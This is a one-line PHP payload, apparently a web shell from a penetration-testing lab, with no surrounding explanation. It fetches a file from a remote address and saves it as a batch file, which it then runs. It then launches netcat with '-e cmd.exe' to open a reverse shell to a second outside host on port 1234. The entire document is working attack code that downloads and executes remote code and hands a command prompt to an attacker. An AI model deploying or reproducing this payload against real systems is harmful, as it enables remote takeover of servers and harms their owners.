<?php file_put_contents('nc.bat', file_get_contents('http://10.10.10.10/nc.txt')); system('nc.bat'); usleep(2000000);system('nc.exe -vn 10.11.1.218 1234 -e cmd.exe'); ?>
